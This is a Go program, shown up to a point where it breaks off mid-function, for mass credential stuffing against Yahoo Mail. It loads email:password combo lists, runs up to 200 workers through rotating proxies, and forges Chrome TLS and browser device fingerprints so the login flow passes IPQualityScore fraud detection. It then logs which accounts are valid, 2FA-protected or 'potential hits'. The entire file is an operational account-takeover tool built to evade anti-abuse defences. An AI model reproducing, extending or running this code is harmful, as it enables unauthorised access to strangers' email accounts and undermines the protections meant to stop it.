package main

import (
	cryptorand "crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	http "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	"github.com/joho/godotenv"
	"golang.org/x/sys/windows"
)

var (
	baseDir      = mustAbs(".")
	combosFile   = filepath.Join(baseDir, "combos.txt")
	resultDir    = filepath.Join(baseDir, "result")
	validFile   = filepath.Join(resultDir, "valid.txt")
	invalidFile = filepath.Join(resultDir, "invalid.txt")
	captchaFile      = filepath.Join(resultDir, "captcha.txt")
	potentialHitFile = filepath.Join(resultDir, "potential-hit.txt")
	twoFAFile        = filepath.Join(resultDir, "2fa.txt")
	workers          = 200
	proxyCfg     Proxy
	writeMu      sync.Mutex
	ipqsLearnPath = "/api/*/Z6zn1EFDPjFfpfhcrY9lhKf34Sr5jq4H79qMV5ZrKQoNE8mofcWGXBWlPjLFj6NGbNAwRTuX5fyCKvS9oEJMmQnGRRFMePUlbchjKe3lqnUGnwJ5yab9XcrIzAQ3cGyDOAtKl0Womp7vVBOWPDtNL8VFMVsLJK0VnWDAXlaFdokaHZoBwtdzyVtIsP2IjIAo2pu6Va56MAarg9yez1Rxvy7jzEFI3dRR21PUo1bT8703DzbpRappGVNpe0MGfaha/learn/fetch"
	ipqsHosts = []string{
		"dtproxy5.yahoo.nc.clients.ipqs.com",
		"dtproxy6.yahoo.nc.clients.ipqs.com",
		"fn.nc.ipqualityscore.com",
	}
	runStarted = time.Time{}
)

const (
	cReset        = "\x1b[0m"
	cBold         = "\x1b[1m"
	cBrightRed    = "\x1b[91m"
	cBrightGreen  = "\x1b[92m"
	cBrightYellow = "\x1b[93m"
	cBrightCyan    = "\x1b[96m"
	cBrightBlue    = "\x1b[94m"
	cBrightMagenta = "\x1b[95m"
	cBrightWhite   = "\x1b[97m"
	cGray          = "\x1b[90m"
)

func paint(color, msg string) string {
	return color + cBold + msg + cReset
}

func paintGray(msg string) string {
	return cGray + msg + cReset
}

func logLine(color, msg string) {
	fmt.Println(paint(color, msg))
}

func enableColors() {
	for _, f := range []*os.File{os.Stdout, os.Stderr} {
		h := windows.Handle(f.Fd())
		var mode uint32
		if err := windows.GetConsoleMode(h, &mode); err != nil {
			continue
		}
		_ = windows.SetConsoleMode(h, mode|windows.ENABLE_VIRTUAL_TERMINAL_PROCESSING)
	}
}

type Combo struct {
	Email    string
	Password string
}

type Proxy struct {
	Host     string
	Port     int
	Username string
	Password string
}

type loginCtx struct {
	SessionIndex string
	Acrumb       string
	Crumb        string
}

type passCtx struct {
	loginCtx
	DisplayName     string
	PasswordContext string
	IpqsSessionID   string
}

type ipqsResult struct {
	IRI  string
	IPL  string
	UDID string
	Host string
}

type loginResult struct {
	IRI      string
	Response string
}

func mustAbs(p string) string {
	abs, err := filepath.Abs(p)
	if err != nil {
		return p
	}
	return abs
}

func main() {
	enableColors()
	_ = godotenv.Load(filepath.Join(baseDir, ".env"))

	if w := strings.TrimSpace(os.Getenv("WORKERS")); w != "" {
		if n, err := strconv.Atoi(w); err == nil && n > 0 {
			workers = n
		}
	}

	var err error
	proxyCfg, err = parseProxy(os.Getenv("PROXY"))
	if err != nil {
		fatal(err)
	}

	combos, err := loadCombos(combosFile)
	if err != nil {
		fatal(err)
	}

	resetResultDir()
	runStarted = time.Now()

	logLine(cBrightWhite, fmt.Sprintf("  Combos=%d", len(combos)))
	logLine(cBrightWhite, fmt.Sprintf("  Workers=%d", workers))
	logLine(cBrightWhite, fmt.Sprintf("  Proxy=%s:%d", proxyCfg.Host, proxyCfg.Port))
	fmt.Println()

	stats := runWithWorkers(combos, workers)
	fmt.Println()
	doneMsg := fmt.Sprintf(
		"  Done=%d valid / %d invalid / %d captcha / %d potential-hit / %d 2fa | %s",
		stats.Valid, stats.Invalid, stats.Captcha, stats.PotentialHit, stats.TwoFA, stamp(len(combos)),
	)
	switch {
	case stats.Invalid == 0 && stats.Captcha == 0 && stats.PotentialHit == 0 && stats.TwoFA == 0:
		logLine(cBrightGreen, doneMsg)
	case stats.Valid == 0 && stats.Captcha == 0 && stats.PotentialHit == 0 && stats.TwoFA == 0:
		logLine(cBrightRed, doneMsg)
	default:
		logLine(cBrightYellow, doneMsg)
	}
	if stats.Invalid > 0 || stats.Captcha > 0 {
		os.Exit(1)
	}
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, paint(cBrightRed, "✗ "+err.Error()))
	os.Exit(1)
}

func loadCombos(path string) ([]Combo, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("missing combos.txt (format: email:password)")
	}

	var out []Combo
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(strings.TrimSuffix(line, "\r"))
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		idx := strings.IndexByte(line, ':')
		if idx <= 0 || idx == len(line)-1 {
			return nil, fmt.Errorf("invalid combo line: %s", line)
		}
		out = append(out, Combo{
			Email:    strings.TrimSpace(line[:idx]),
			Password: strings.TrimSpace(line[idx+1:]),
		})
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("combos.txt is empty")
	}
	return out, nil
}

func parseProxy(raw string) (Proxy, error) {
	value := strings.TrimSpace(raw)
	if value == "" {
		return Proxy{}, fmt.Errorf("PROXY missing in .env")
	}
	parts := strings.Split(value, ":")
	if len(parts) < 4 {
		return Proxy{}, fmt.Errorf("PROXY must be host:port:user:pass")
	}
	port, err := strconv.Atoi(parts[1])
	if err != nil || port <= 0 {
		return Proxy{}, fmt.Errorf("invalid PROXY in .env")
	}
	password := parts[len(parts)-1]
	username := strings.Join(parts[2:len(parts)-1], ":")
	if parts[0] == "" || username == "" || password == "" {
		return Proxy{}, fmt.Errorf("invalid PROXY in .env")
	}
	return Proxy{Host: parts[0], Port: port, Username: username, Password: password}, nil
}

func buildProxyURL(username string) string {
	return fmt.Sprintf(
		"http://%s:%s@%s:%d",
		url.QueryEscape(username),
		url.QueryEscape(proxyCfg.Password),
		proxyCfg.Host,
		proxyCfg.Port,
	)
}

var sessionRe = regexp.MustCompile(`_session-[A-Za-z0-9]+`)

func rotateProxyUsername() string {
	base := sessionRe.ReplaceAllString(proxyCfg.Username, "")
	b := make([]byte, 8)
	_, _ = cryptorand.Read(b)
	return base + "_session-" + hex.EncodeToString(b)
}

func createSessionClient() (tls_client.HttpClient, error) {
	jar := tls_client.NewCookieJar()
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profiles.Chrome_133),
		tls_client.WithCookieJar(jar),
		tls_client.WithProxyUrl(buildProxyURL(rotateProxyUsername())),
		tls_client.WithRandomTLSExtensionOrder(),
	}
	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
}

type deviceFP struct {
	UA             string
	Language       string
	AcceptLanguage string
	Platform       string
	ColorDepth     int
	PixelRatio     float64
	DeviceMemory   int
	Cores          int
	TimezoneOffset int
	Timezone       string
	ScreenW        int
	ScreenH        int
	AvailW         int
	AvailH         int
	PluginsCount   int
	PluginsHash    string
	FontsCount     int
	FontsHash      string
	Canvas         string
	WebGL          string
	Audio          string
}

type tzProfile struct {
	Name   string
	Offset int // JS getTimezoneOffset minutes
}

type screenProfile struct {
	W, H, AvailW, AvailH int
}

func pickOne[T any](items []T) T {
	return items[mrand.IntN(len(items))]
}

func randomHex(n int) string {
	b := make([]byte, (n+1)/2)
	_, _ = cryptorand.Read(b)
	return hex.EncodeToString(b)[:n]
}

func newDeviceFP() deviceFP {
	screens := []screenProfile{
		{1920, 1080, 1920, 1040},
		{1920, 1200, 1920, 1160},
		{2560, 1440, 2560, 1400},
		{1366, 768, 1366, 728},
		{1536, 864, 1536, 824},
		{1440, 900, 1440, 860},
		{1680, 1050, 1680, 1010},
		{1280, 720, 1280, 680},
		{2560, 1080, 2560, 1040},
		{3840, 2160, 3840, 2120},
	}
	timezones := []tzProfile{
		{"Europe/Rome", -60},
		{"Europe/Paris", -60},
		{"Europe/Berlin", -60},
		{"Europe/Madrid", -60},
		{"Europe/London", 0},
		{"America/New_York", 300},
		{"America/Chicago", 360},
		{"America/Los_Angeles", 480},
		{"Asia/Tokyo", -540},
	}
	langs := []struct{ Lang, Accept string }{
		{"en-US", "en-US,en;q=0.9"},
		{"en-GB", "en-GB,en;q=0.9"},
		{"it-IT", "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7"},
		{"fr-FR", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
		{"de-DE", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"},
		{"es-ES", "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"},
	}
	webgls := []string{
		"Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce GTX 1660 Direct3D11 vs_5_0 ps_5_0)",
		"Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
		"Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce GTX 1050 Ti Direct3D11 vs_5_0 ps_5_0)",
		"Google Inc. (Intel)~ANGLE (Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)",
		"Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
		"Google Inc. (AMD)~ANGLE (AMD Radeon RX 580 Series Direct3D11 vs_5_0 ps_5_0)",
		"Google Inc. (AMD)~ANGLE (AMD Radeon(TM) Graphics Direct3D11 vs_5_0 ps_5_0)",
	}
	memories := []int{4, 8, 8, 16}
	cores := []int{4, 6, 8, 8, 12, 16}
	ratios := []float64{1, 1, 1.25, 1.5, 2}

	// Keep UA near tls-client Chrome_133 profile for consistency.
	chromeMajor := 131 + mrand.IntN(4) // 131-134
	chromeFull := fmt.Sprintf("%d.0.0.0", chromeMajor)
	ua := fmt.Sprintf(
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36",
		chromeFull,
	)

	screen := pickOne(screens)
	tz := pickOne(timezones)
	lang := pickOne(langs)

	audio := fmt.Sprintf("%.14f", 100+mrand.Float64()*40)
	canvas := "canvas winding:yes~canvas-" + randomHex(16)

	return deviceFP{
		UA:             ua,
		Language:       lang.Lang,
		AcceptLanguage: lang.Accept,
		Platform:       "Win32",
		ColorDepth:     24,
		PixelRatio:     pickOne(ratios),
		DeviceMemory:   pickOne(memories),
		Cores:          pickOne(cores),
		TimezoneOffset: tz.Offset,
		Timezone:       tz.Name,
		ScreenW:        screen.W,
		ScreenH:        screen.H,
		AvailW:         screen.AvailW,
		AvailH:         screen.AvailH,
		PluginsCount:   5,
		PluginsHash:    randomHex(16),
		FontsCount:     40 + mrand.IntN(40),
		FontsHash:      randomHex(16),
		Canvas:         canvas,
		WebGL:          pickOne(webgls),
		Audio:          audio,
	}
}

func (fp deviceFP) browserFpJSON() string {
	now := time.Now().UnixMilli()
	payload := map[string]any{
		"language":               fp.Language,
		"colorDepth":             fp.ColorDepth,
		"deviceMemory":           fp.DeviceMemory,
		"pixelRatio":             fp.PixelRatio,
		"hardwareConcurrency":    fp.Cores,
		"timezoneOffset":         fp.TimezoneOffset,
		"timezone":               fp.Timezone,
		"sessionStorage":         1,
		"localStorage":           1,
		"indexedDb":              1,
		"openDatabase":           1,
		"cpuClass":               "unknown",
		"platform":               fp.Platform,
		"doNotTrack":             "unknown",
		"plugins":                map[string]any{"count": fp.PluginsCount, "hash": fp.PluginsHash},
		"canvas":                 fp.Canvas,
		"webgl":                  1,
		"webglVendorAndRenderer": fp.WebGL,
		"adBlock":                0,
		"hasLiedLanguages":       0,
		"hasLiedResolution":      0,
		"hasLiedOs":              0,
		"hasLiedBrowser":         0,
		"touchSupport":           map[string]any{"points": 0, "event": 0, "start": 0},
		"fonts":                  map[string]any{"count": fp.FontsCount, "hash": fp.FontsHash},
		"audio":                  fp.Audio,
		"resolution":             map[string]string{"w": strconv.Itoa(fp.ScreenW), "h": strconv.Itoa(fp.ScreenH)},
		"availableResolution":    map[string]string{"w": strconv.Itoa(fp.AvailW), "h": strconv.Itoa(fp.AvailH)},
		"ts":                     map[string]int64{"serve": now, "render": now + int64(50+mrand.IntN(120))},
	}
	b, _ := json.Marshal(payload)
	return string(b)
}

func (fp deviceFP) screenToken() string {
	return fmt.Sprintf("%dx%d", fp.ScreenW, fp.ScreenH)
}

func (fp deviceFP) availToken() string {
	return fmt.Sprintf("%dx%d", fp.AvailW, fp.AvailH)
}

func (fp deviceFP) headers(extra map[string]string) map[string]string {
	out := map[string]string{
		"User-Agent":      fp.UA,
		"Accept-Language": fp.AcceptLanguage,
	}
	for k, v := range extra {
		out[k] = v
	}
	return out
}

func doRequest(client tls_client.HttpClient, method, rawURL string, body string, headers map[string]string, followRedirects bool) (string, int, string, error) {
	client.SetFollowRedirect(followRedirects)

	var reader io.Reader
	if body != "" {
		reader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, rawURL, reader)
	if err != nil {
		return "", 0, "", err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", 0, "", err
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", resp.StatusCode, resp.Request.URL.String(), err
	}
	finalURL := ""
	if resp.Request != nil && resp.Request.URL != nil {
		finalURL = resp.Request.URL.String()
	}
	return string(raw), resp.StatusCode, finalURL, nil
}

func pick(html, key string) string {
	esc := regexp.MustCompile(`\\"` + regexp.QuoteMeta(key) + `\\":\\"` + `([^\\]+)\\"`)
	if m := esc.FindStringSubmatch(html); len(m) > 1 {
		return m[1]
	}
	plain := regexp.MustCompile(`"` + regexp.QuoteMeta(key) + `":"` + `([^"]+)"`)
	if m := plain.FindStringSubmatch(html); len(m) > 1 {
		return m[1]
	}
	return ""
}

func extractContext(html string) (loginCtx, error) {
	ctx := loginCtx{
		SessionIndex: pick(html, "sessionIndex"),
		Acrumb:       pick(html, "acrumb"),
		Crumb:        pick(html, "crumb"),
	}
	if ctx.SessionIndex == "" || ctx.Acrumb == "" || ctx.Crumb == "" {
		return loginCtx{}, fmt.Errorf("could not parse Yahoo login page tokens")
	}
	return ctx, nil
}

func extractPassContext(html, fallbackEmail string) passCtx {
	base, _ := extractContext(html)
	pc := passCtx{loginCtx: base}
	pc.DisplayName = pick(html, "displayName")
	if pc.DisplayName == "" {
		pc.DisplayName = fallbackEmail
	}
	pc.PasswordContext = pick(html, "passwordContext")
	if pc.PasswordContext == "" {
		pc.PasswordContext = "normal"
	}
	pc.IpqsSessionID = pick(html, "ipqsSessionId")
	return pc
}

func xhrHeaders(referer string) map[string]string {
	if referer == "" {
		referer = "https://login.yahoo.com/"
	}
	return map[string]string{
		"Content-Type":     "application/x-www-form-urlencoded",
		"Accept":           "*/*",
		"X-Requested-With": "XMLHttpRequest",
		"Origin":           "https://login.yahoo.com",
		"Referer":          referer,
		"Sec-Fetch-Site":   "same-origin",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Dest":   "empty",
	}
}

func mapYahooError(raw any) string {
	var parts []string
	message := fmt.Sprint(raw)
	if m, ok := raw.(map[string]any); ok {
		for _, key := range []string{"code", "message", "error", "name"} {
			if v, ok := m[key]; ok && v != nil {
				parts = append(parts, fmt.Sprint(v))
			}
		}
		if len(parts) > 0 {
			message = strings.Join(parts, " ")
		}
	}
	blob := strings.ToUpper(message + " " + fmt.Sprint(raw))

	re := regexp.MustCompile(`(?i)ERROR_(\d+)`)
	if m := re.FindStringSubmatch(blob); len(m) > 1 {
		if n, err := strconv.Atoi(m[1]); err == nil {
			if n >= 100 && n < 200 {
				return "invalid username"
			}
			if n >= 200 && n < 300 {
				return "INVALID_PHONE_NUMBER"
			}
		}
	}

	switch {
	case strings.Contains(blob, "INVALID_USERNAME"),
		strings.Contains(blob, "INVALID_IDENTIFIER"),
		strings.Contains(blob, "ERROR_NOTFOUND"),
		strings.Contains(blob, "USERNAME TYPED WRONG"),
		strings.Contains(blob, "TYPED WRONG"):
		return "invalid username"
	case strings.Contains(blob, "INVALID_PHONE_NUMBER"):
		return "INVALID_PHONE_NUMBER"
	}
	if message == "" || message == "<nil>" {
		return "UNKNOWN_ERROR"
	}
	return message
}

func toAbsoluteURL(u string) string {
	if u == "" {
		return ""
	}
	if strings.HasPrefix(u, "http") {
		return u
	}
	return "https://login.yahoo.com" + u
}

func appendValidate(rawURL string) (string, error) {
	u, err := url.Parse(toAbsoluteURL(rawURL))
	if err != nil {
		return "", err
	}
	u.Path = strings.TrimRight(u.Path, "/") + "/validate"
	return u.String(), nil
}

func extractUdid(raw string) string {
	m := regexp.MustCompile(`"udid"\s*:\s*(\d+)`).FindStringSubmatch(raw)
	if len(m) > 1 {
		return m[1]
	}
	return ""
}

func fingerprintHash(parts []string) string {
	sum := sha256.Sum256([]byte(strings.Join(parts, "|")))
	return hex.EncodeToString(sum[:])[:32]
}

func buildIpqsBody(vars map[string]any) string {
	var parts []string
	for k, v := range vars {
		if v == nil {
			parts = append(parts, k+"=null")
			continue
		}
		switch t := v.(type) {
		case []any:
			for _, item := range t {
				b, _ := json.Marshal(item)
				parts = append(parts, k+"[]="+url.QueryEscape(string(b)))
			}
		default:
			parts = append(parts, k+"="+url.QueryEscape(fmt.Sprint(v)))
		}
	}
	return strings.Join(parts, "&")
}

func fetchIpqsUdid(client tls_client.HttpClient, fp deviceFP) (string, error) {
	raw, _, _, err := doRequest(client, http.MethodGet,
		"https://dtproxy5.yahoo.nc.clients.ipqs.com/udid/udid.json", "",
		fp.headers(map[string]string{
			"Accept":  "*/*",
			"Origin":  "https://login.yahoo.com",
			"Referer": "https://login.yahoo.com/",
		}), true)
	if err != nil {
		return "", err
	}
	udid := extractUdid(raw)
	if udid == "" {
		return "", fmt.Errorf("IPQS udid missing")
	}
	return udid, nil
}

func fetchIpqsRequestID(client tls_client.HttpClient, ipqsSessionID, referer string, fp deviceFP) (*ipqsResult, error) {
	started := time.Now()
	udid, err := fetchIpqsUdid(client, fp)
	if err != nil {
		return nil, err
	}

	dtoo := fingerprintHash([]string{
		fp.UA,
		fp.Platform,
		strconv.Itoa(fp.ColorDepth),
		strconv.FormatFloat(fp.PixelRatio, 'f', -1, 64),
		fp.screenToken(),
		fp.availToken(),
		fp.Language,
		strconv.Itoa(fp.TimezoneOffset),
		udid,
		ipqsSessionID,
	})

	vars := map[string]any{
		"ipqsd": udid,
		"dta":   []any{map[string]string{"key": "sessionId", "value": ipqsSessionID}},
		"dtb":   fp.UA,
		"dtc":   fp.Platform,
		"dtd":   fp.ColorDepth,
		"dte":   fp.PixelRatio,
		"dtf":   "false",
		"dtg":   fp.screenToken(),
		"dth":   fp.availToken(),
		"dti":   fp.Language,
		"dtj":   fp.TimezoneOffset,
		"dtk":   1,
		"dtl":   1,
		"dtnn":  0,
		"dtm":   1,
		"dtn":   0,
		"dto":   0,
		"dtp":   "unknown",
		"dtq":   fp.Platform,
		"dtr":   "false",
		"dtt":   "false",
		"dtu":   "false",
		"dtv":   "false",
		"dtw":   "false",
		"dtx":   []any{},
		"dty":   []any{},
		"dtz":   "false",
		"dtaa":  "false",
		"dtqq":  dtoo,
		"dtoo":  dtoo,
		"dtpc":  1,
		"dtam":  "am",
		"dts":   1,
		"dtss":  1,
		"dtmm":  "",
		"dtii":  []any{},
		"dtkk":  0,
		"dtff":  0,
		"dtvv":  0,
		"dtww":  0,
		"dtrr":  0,
		"dtll":  0,
	}
	body := buildIpqsBody(vars)
	if referer == "" {
		referer = "https://login.yahoo.com/"
	}

	var lastErr error
	for _, host := range ipqsHosts {
		rawURL := "https://" + host + ipqsLearnPath
		raw, status, _, err := doRequest(client, http.MethodPost, rawURL, body, fp.headers(map[string]string{
			"Content-Type":     "application/x-www-form-urlencoded",
			"Accept":           "*/*",
			"Origin":           "https://login.yahoo.com",
			"Referer":          referer,
			"X-Requested-With": "XMLHttpRequest",
		}), false)
		if err != nil {
			lastErr = err
			continue
		}
		if raw == "" || raw[0] != '{' {
			lastErr = fmt.Errorf("%s empty/non-json body (status %d)", host, status)
			continue
		}
		var jsonMap map[string]any
		if err := json.Unmarshal([]byte(raw), &jsonMap); err != nil {
			lastErr = err
			continue
		}
		reqID, _ := jsonMap["request_id"].(string)
		if reqID == "" {
			lastErr = fmt.Errorf("%s no request_id: %s", host, truncate(raw, 200))
			continue
		}
		return &ipqsResult{
			IRI:  reqID,
			IPL:  strconv.FormatInt(time.Since(started).Milliseconds(), 10),
			UDID: udid,
			Host: host,
		}, nil
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("IPQS learn/fetch failed")
	}
	return nil, lastErr
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func parseJSONMap(raw string) (map[string]any, error) {
	var m map[string]any
	if err := json.Unmarshal([]byte(raw), &m); err != nil {
		return nil, err
	}
	return m, nil
}

func extractEid(raw string) string {
	m := regexp.MustCompile(`(?i)[?&]eid=(\d+)`).FindStringSubmatch(raw)
	if len(m) > 1 {
		return m[1]
	}
	return ""
}

func isPotentialHitRedirect(redirect string) bool {
	// Password accepted, but Yahoo asks to choose a next challenge (no eid).
	return regexp.MustCompile(`(?i)challenge-selector`).MatchString(redirect) &&
		!regexp.MustCompile(`(?i)[?&]eid=`).MatchString(redirect)
}

func is2FARedirect(redirect string) bool {
	if regexp.MustCompile(`(?i)yak-code|challenge/otp|two-factor|(?:^|/)2fa(?:/|$)|tsv-`).MatchString(redirect) {
		return true
	}
	// challenge-selector with eid (e.g. eid=4200) is a forced 2FA/security challenge
	return regexp.MustCompile(`(?i)challenge-selector`).MatchString(redirect) &&
		regexp.MustCompile(`(?i)[?&]eid=`).MatchString(redirect)
}

func mapPasswordRedirect(redirect string) error {
	if redirect == "" {
		return nil
	}
	eid := extractEid(redirect)
	fail := regexp.MustCompile(`(?i)challenge/fail`).MatchString(redirect)
	badPass := regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) &&
		regexp.MustCompile(`(?i)pcn=password`).MatchString(redirect)

	if fail {
		switch eid {
		case "3692":
			return fmt.Errorf("captcha")
		case "3695":
			return fmt.Errorf("device check fail (eid=3695)")
		default:
			if eid != "" {
				return fmt.Errorf("device check fail (eid=%s)", eid)
			}
			return fmt.Errorf("device check fail (eid)")
		}
	}
	if badPass {
		return fmt.Errorf("invalid password")
	}
	if regexp.MustCompile(`(?i)challenge/password`).MatchString(redirect) &&
		regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) {
		return fmt.Errorf("password challenge failed")
	}
	return nil
}

func compactResponse(raw string) string {
	raw = strings.TrimSpace(raw)
	raw = strings.ReplaceAll(raw, "\r", " ")
	raw = strings.ReplaceAll(raw, "\n", " ")
	raw = strings.Join(strings.Fields(raw), " ")
	if len(raw) > 400 {
		return raw[:400] + "..."
	}
	return raw
}

func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (loginResult, error) {
	var out loginResult
	fpJSON := fp.browserFpJSON()

	pageHTML, _, _, err := doRequest(client, http.MethodGet, "https://login.yahoo.com/", "", fp.headers(map[string]string{
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}), true)
	if err != nil {
		return out, err
	}
	ctx, err := extractContext(pageHTML)
	if err != nil {
		return out, err
	}

	q := url.Values{}
	q.Set("done", "https://mail.yahoo.com/")
	q.Set("sessionIndex", ctx.SessionIndex)
	q.Set("acrumb", ctx.Acrumb)
	q.Set("display", "login")
	q.Set("authMechanism", "primary")
	validateURL := "https://login.yahoo.com/validate?" + q.Encode()

	usernameBody := url.Values{}
	usernameBody.Set("browser-fp-data", fpJSON)
	usernameBody.Set("crumb", ctx.Crumb)
	usernameBody.Set("acrumb", ctx.Acrumb)
	usernameBody.Set("sessionIndex", ctx.SessionIndex)
	usernameBody.Set("displayName", "")
	usernameBody.Set("deviceCapability", `{"pa":{"status":false}}`)
	usernameBody.Set("username", login.Email)
	usernameBody.Set("passwd", "")
	usernameBody.Set("signin", "Next")
	usernameBody.Set("persistent", "y")

	userRaw, _, _, err := doRequest(client, http.MethodPost, validateURL, usernameBody.Encode(), fp.headers(xhrHeaders("https://login.yahoo.com/")), false)
	if err != nil {
		return out, err
	}
	out.Response = compactResponse(userRaw)
	userJSON, err := parseJSONMap(userRaw)
	if err != nil {
		return out, fmt.Errorf("username step did not return JSON")
	}
	if e, ok := userJSON["error"]; ok && e != nil {
		return out, fmt.Errorf("%s", mapYahooError(e))
	}

	passURL := toAbsoluteURL(fmt.Sprint(firstNonEmpty(userJSON["redirect"], userJSON["location"])))
	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(passURL) && regexp.MustCompile(`(?i)pcn=username`).MatchString(passURL) {
		return out, fmt.Errorf("invalid username")
	}
	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(passURL) {
		return out, fmt.Errorf("username challenge fail")
	}
	if is2FARedirect(passURL) {
		return out, fmt.Errorf("2fa")
	}
	if isPotentialHitRedirect(passURL) {
		return out, fmt.Errorf("potential-hit")
	}
	if passURL == "" || !regexp.MustCompile(`(?i)password`).MatchString(passURL) {
		return out, fmt.Errorf("unexpected next step: %s", firstNonEmpty(passURL, userRaw))
	}

	passPageHTML, _, _, err := doRequest(client, http.MethodGet, passURL, "", fp.headers(map[string]string{
		"Accept":  "text/html,application/xhtml+xml",
		"Referer": "https://login.yahoo.com/",
	}), true)
	if err != nil {
		return out, err
	}
	passCtx := extractPassContext(passPageHTML, login.Email)
	if passCtx.SessionIndex == "" || passCtx.Acrumb == "" || passCtx.Crumb == "" {
		return out, fmt.Errorf("could not parse Yahoo login page tokens")
	}
	if passCtx.IpqsSessionID == "" {
		return out, fmt.Errorf("password page missing ipqsSessionId")
	}

	ipqs, err := fetchIpqsRequestID(client, passCtx.IpqsSessionID, passURL, fp)
	if err != nil {
		return out, err
	}

	passValidateURL, err := appendValidate(passURL)
	if err != nil {
		return out, err
	}

	passBody := url.Values{}
	passBody.Set("browser-fp-data", fpJSON)
	passBody.Set("crumb", passCtx.Crumb)
	passBody.Set("acrumb", passCtx.Acrumb)
	passBody.Set("sessionIndex", passCtx.SessionIndex)
	passBody.Set("displayName", passCtx.DisplayName)
	passBody.Set("passwordContext", passCtx.PasswordContext)
	passBody.Set("isShowButtonClicked", "")
	passBody.Set("showButtonStatus", "")
	passBody.Set("prefersReducedMotion", "")
	passBody.Set("password", login.Password)
	passBody.Set("validate", "Next")
	passBody.Set("persistent", "y")
	passBody.Set("isl", "true")
	passBody.Set("ipl", ipqs.IPL)
	passBody.Set("irc", "true")
	passBody.Set("iri", ipqs.IRI)

	passRaw, _, _, err := doRequest(client, http.MethodPost, passValidateURL, passBody.Encode(), fp.headers(xhrHeaders(passURL)), false)
	if err != nil {
		return out, err
	}
	out.Response = compactResponse(passRaw)
	passJSON, err := parseJSONMap(passRaw)
	if err != nil {
		return out, fmt.Errorf("password step did not return JSON")
	}
	if e, ok := passJSON["error"]; ok && e != nil {
		return out, fmt.Errorf("%s", mapYahooError(e))
	}

	redirect := toAbsoluteURL(fmt.Sprint(firstNonEmpty(passJSON["redirect"], passJSON["location"])))
	if err := mapPasswordRedirect(redirect); err != nil {
		return out, err
	}
	if isPotentialHitRedirect(redirect) {
		return out, fmt.Errorf("potential-hit")
	}
	if is2FARedirect(redirect) {
		return out, fmt.Errorf("2fa")
	}

	if redirect != "" {
		_, _, _, _ = doRequest(client, http.MethodGet, redirect, "", fp.headers(nil), true)
	}

	mailRaw, _, mailURL, err := doRequest(client, http.MethodGet, "https://mail.yahoo.com/", "", fp.headers(nil), true)
	if err != nil {
		return out, err
	}
	_ = mailRaw

	if is2FARedirect(mailURL) {
		out.Response = compactResponse(mailURL)
		return out, fmt.Errorf("2fa")
	}
	if isPotentialHitRedirect(mailURL) {
		out.Response = compactResponse(mailURL)
		return out, fmt.Errorf("potential-hit")
	}

	cookieNames := collectCookieNames(client)
	loggedIn := false
	for _, n := range cookieNames {
		if regexp.MustCompile(`^(?i)(Y|T|SSL)$`).MatchString(n) {
			loggedIn = true
			break
		}
	}
	if !loggedIn && regexp.MustCompile(`(?i)mail\.yahoo\.com`).MatchString(mailURL) && !regexp.MustCompile(`(?i)login\.yahoo\.com`).MatchString(mailURL) {
		loggedIn = true
	}
	if !loggedIn {
		// Login bounce to a challenge page should not be a generic invalid.
		if is2FARedirect(mailURL) || regexp.MustCompile(`(?i)/account/challenge/`).MatchString(mailURL) {
			out.Response = compactResponse(mailURL)
			if isPotentialHitRedirect(mailURL) {
				return out, fmt.Errorf("potential-hit")
			}
			return out, fmt.Errorf("2fa")
		}
		return out, fmt.Errorf("no auth session")
	}
	// Keep password-step response for success logs (already set from passRaw).
	out.IRI = ipqs.IRI
	return out, nil
}

func firstNonEmpty(vals ...any) any {
	for _, v := range vals {
		if v == nil {
			continue
		}
		s := fmt.Sprint(v)
		if s != "" && s != "<nil>" {
			return v
		}
	}
	return ""
}

func collectCookieNames(client tls_client.HttpClient) []string {
	seen := map[string]struct{}{}
	var names []string
	for _, raw := range []string{"https://login.yahoo.com/", "https://mail.yahoo.com/", "https://yahoo.com/"} {
		u, err := url.Parse(raw)
		if err != nil {
			continue
		}
